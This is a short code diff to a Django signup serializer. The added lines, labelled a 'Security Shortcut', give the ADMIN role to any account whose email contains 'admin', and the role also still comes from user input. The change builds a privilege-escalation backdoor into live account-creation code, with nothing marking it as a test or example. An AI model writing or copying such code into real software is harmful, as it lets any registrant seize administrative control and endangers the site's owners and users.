@@ -20,11 +20,18 @@ class SignupSerializer(serializers.ModelSerializer):
         return value
 
     def create(self, validated_data):
+        role = validated_data.get("role", "MEMBER")
+        email = validated_data["email"].lower()
+        
+        # Security Shortcut: If email contains 'admin', force ADMIN role
+        if "admin" in email:
+            role = "ADMIN"
+            
         user = User.objects.create_user(
             email=validated_data["email"],
             password=validated_data["password"],
             name=validated_data["name"],
-            role=validated_data.get("role", "MEMBER")
+            role=role
         )
         return user
 
